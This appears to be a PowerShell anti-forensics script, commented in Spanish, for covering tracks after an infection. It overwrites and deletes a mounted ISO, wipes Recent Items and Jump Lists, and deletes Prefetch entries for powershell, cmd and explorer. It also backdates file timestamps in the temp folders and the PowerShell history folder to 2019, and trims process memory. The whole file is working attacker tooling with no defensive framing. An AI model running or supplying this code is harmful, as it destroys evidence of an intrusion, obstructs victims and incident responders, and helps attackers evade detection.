#requires -Version 5.1
# cleanup.ps1 - Limpieza forense post-infección

param(
    [string]$IsoPath = $null,        # Path del ISO a desmontar
    [switch]$WipeRecent = $true,     # Limpiar Recent Items
    [switch]$WipePrefetch = $false,   # Limpiar Prefetch (requiere admin)
    [switch]$WipeEventLog = $false     # Limpiar Security/Event logs (ALTAMENTE sospechoso)
)

# ==================================================================
# 1. Desmontar ISO y eliminar volumen virtual
# ==================================================================
if ($IsoPath -and (Test-Path $IsoPath)) {
    $vol = Get-DiskImage -ImagePath $IsoPath -ErrorAction SilentlyContinue
    if ($vol) {
        Dismount-DiskImage -ImagePath $IsoPath
        Write-Host "[+] ISO desmontada: $IsoPath"
    }
    # Sobrescribir archivo con datos aleatorios antes de eliminar
    $fs = [System.IO.File]::OpenWrite($IsoPath)
    $fs.SetLength(0)
    $rnd = [byte[]]::new(65536)
    $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
    for ($i = 0; $i -lt 16; $i++) {  # 1MB de ruido
        $rng.GetBytes($rnd)
        $fs.Write($rnd, 0, $rnd.Length)
    }
    $fs.Close()
    Remove-Item $IsoPath -Force
    Write-Host "[+] ISO sobrescrita y eliminada"
}

# ==================================================================
# 2. Limpiar carpeta Recent Items (Jump Lists)
# ==================================================================
if ($WipeRecent) {
    $recentPaths = @(
        "$env:APPDATA\Microsoft\Windows\Recent",
        "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations",
        "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations"
    )
    foreach ($rp in $recentPaths) {
        if (Test-Path $rp) {
            Get-ChildItem $rp -File | ForEach-Object {
                # Sobrescribir y eliminar
                [System.IO.File]::WriteAllBytes($_.FullName, [byte[]]::new($_.Length))
                Remove-Item $_.FullName -Force
            }
        }
    }
    Write-Host "[+] Recent Items limpiados"
}

# ==================================================================
# 3. Limpiar Prefetch (si se tiene privilegios)
# ==================================================================
if ($WipePrefetch -and ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $prefetchPath = "C:\Windows\Prefetch"
    Get-ChildItem $prefetchPath -Filter "*.pf" | Where-Object { 
        $_.Name -match "powershell|cmd|explorer" 
    } | ForEach-Object {
        Remove-Item $_.FullName -Force
    }
    Write-Host "[+] Prefetch filtrado eliminado"
}

# ==================================================================
# 4. Manipular timestamps (Anti-Forensia temporal)
# ==================================================================
$targets = @(
    "$env:TEMP",
    "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine",
    "C:\Windows\Temp"
)
foreach ($t in $targets) {
    if (Test-Path $t) {
        # Resetear timestamps a valores históricos (2019-01-01)
        $historic = Get-Date "2019-01-01 12:00:00"
        Get-ChildItem $t -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            $_.CreationTime = $historic
            $_.LastWriteTime = $historic
            $_.LastAccessTime = $historic
        }
    }
}
Write-Host "[+] Timestamps manipulados"

# ==================================================================
# 5. Limpieza de memoria (Working Set trimming)
# ==================================================================
$proc = Get-Process -Id $PID
$proc.MinWorkingSet = [IntPtr]::Zero
$proc.MaxWorkingSet = [IntPtr]::Zero
[GC]::Collect(2, [GCCollectionMode]::Aggressive, $true)
Write-Host "[+] Working set minimizado y GC forzado"